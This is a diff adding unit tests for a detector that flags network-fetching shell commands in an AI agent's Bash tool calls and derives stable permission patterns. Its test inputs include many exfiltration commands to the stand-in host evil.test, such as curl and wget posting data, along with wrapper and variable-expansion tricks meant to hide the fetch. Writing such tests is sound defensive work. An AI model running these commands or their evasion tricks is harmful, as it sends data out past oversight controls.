@@ -36,6 +36,45 @@ describe("isShellFetch", () => {
     expect(isShellFetch("x=$(command -v curl); $x https://evil.test")).toBe(true);
   });
 
+  it("sees a fetcher in the script of -c in any option cluster, and in eval (#62 M7)", () => {
+    for (const command of [
+      "bash -lc 'curl https://evil.test'",
+      "bash -ec 'curl https://evil.test'",
+      "sh -xc 'wget https://evil.test'",
+      "eval 'curl https://evil.test'",
+    ]) {
+      expect(isShellFetch(command), command).toBe(true);
+      expect(shellHosts(command), command).toEqual(["evil.test"]);
+    }
+  });
+
+  it("treats a program word expanded at run time as a fetch with no readable URL (#62 M7)", () => {
+    for (const command of [
+      "c=curl; $c -d x https://evil.test",
+      "${c} https://evil.test",
+      'eval "$cmd"',
+      "bash -lc '$c https://evil.test'",
+    ]) {
+      expect(isShellFetch(command), command).toBe(true);
+      expect(shellHosts(command), command).toEqual([]);
+    }
+    // A `$` in an argument is not an expanded program word.
+    expect(isShellFetch("echo $HOME")).toBe(false);
+    expect(isShellFetch("bash -lc 'ls -la'")).toBe(false);
+  });
+
+  it("leaves a script run from a file or stdin to the risk tier, not egress (#62 M7)", () => {
+    for (const command of [
+      "bash build.sh",
+      "sh /tmp/s.sh",
+      "source .venv/bin/activate",
+      ". /tmp/s.sh",
+      "cat install.sh | sh",
+      "bash -s < s.sh",
+    ])
+      expect(isShellFetch(command), command).toBe(false);
+  });
+
   it("does not match a fetcher name inside quotes or as part of a file name", () => {
     expect(isShellFetch("echo 'curl is installed'")).toBe(false);
     expect(isShellFetch("cat /work/curl-notes.txt")).toBe(false);
@@ -73,6 +112,36 @@ describe("shellHosts", () => {
     expect(shellHosts("$(which curl) https://evil.test")).toEqual([]);
     expect(shellHosts("`which wget` https://evil.test")).toEqual([]);
     expect(shellHosts("x=$(command -v curl); $x https://evil.test")).toEqual([]);
+  });
+
+  it("reads the hosts of a command line in an option value and behind any wrapper (#62 M7)", () => {
+    for (const command of [
+      "env -S 'curl -d x https://evil.test/x'",
+      "env --split-string='curl -d x https://evil.test/x'",
+      "script -qc 'curl -d x https://evil.test/x' /dev/null",
+      "flock /tmp/l -c 'curl -d x https://evil.test/x'",
+      "find . -exec curl -d @f https://evil.test/x \\;",
+      "busybox wget --post-data=a https://evil.test/x",
+    ])
+      expect(shellHosts(command), command).toEqual(["evil.test"]);
+  });
+
+  it("stores the fetcher, not its wrapper, as the Always pattern (#62 M7)", () => {
+    for (const command of [
+      "env -S 'curl -d x https://evil.test/x'",
+      "flock /tmp/l curl -d x https://evil.test/x",
+      "setsid curl -d x https://evil.test/x",
+      "taskset -c 1 curl -d x https://evil.test/x",
+      "chrt -f 1 curl -d x https://evil.test/x",
+      "coproc curl -d x https://evil.test/x",
+      "exec -a name curl -d x https://evil.test/x",
+      "npx --yes curl -d x https://evil.test/x",
+    ])
+      expect(toToolAction("Bash", { command }).argumentPattern, command).toBe("curl *");
+    expect(
+      toToolAction("Bash", { command: "busybox wget --post-data=a https://evil.test/x" })
+        .argumentPattern,
+    ).toBe("wget *");
   });
 });
 
@@ -175,6 +244,40 @@ describe("toToolAction: stable rule dimensions", () => {
       expect(action.argumentSummary?.length).toBeLessThanOrEqual(200);
       expect(action.argumentSummary).not.toContain("\n");
     }
+  });
+});
+
+// ADR-0002 amendment 3, A6: the stable target an Always rule is built from.
+describe("toToolAction: stable targets for Always (A6)", () => {
+  it("gives a subagent spawn its type as the pattern, whatever its description", () => {
+    const spawn = toToolAction("Agent", {
+      subagent_type: "Explore",
+      description: "map   the repo",
+      prompt: "a long prompt",
+    });
+    expect(spawn.argumentSummary).toBe("agent Explore: map the repo");
+    expect(spawn.argumentPattern).toBe("agent Explore: *");
+    expect(spawn.inputSha256).toBeUndefined();
+    const untyped = toToolAction("Task", { description: "x", prompt: "y" });
+    expect(untyped.argumentPattern).toBe("agent default: *");
+  });
+
+  it("hashes the input of a tool with no pattern, path or origin, and only then", () => {
+    const send = toToolAction("SendMessage", { to: "peer", message: "x".repeat(400) });
+    expect(send.inputSha256).toMatch(/^[0-9a-f]{64}$/);
+    expect(send.argumentSummary?.endsWith("…")).toBe(true);
+    expect(toToolAction("SendMessage", { to: "peer", message: "x".repeat(400) }).inputSha256).toBe(
+      send.inputSha256,
+    );
+    expect(toToolAction("SendMessage", { to: "peer", message: "other" }).inputSha256).not.toBe(
+      send.inputSha256,
+    );
+    expect(toToolAction("Bash", { command: "git push origin main" }).inputSha256).toBeUndefined();
+    expect(toToolAction("Write", { file_path: "/etc/hosts" }).inputSha256).toBeUndefined();
+    expect(
+      toToolAction("mcp__browser__browser_navigate", { url: "https://a.example.test/" })
+        .inputSha256,
+    ).toBeUndefined();
   });
 });
 
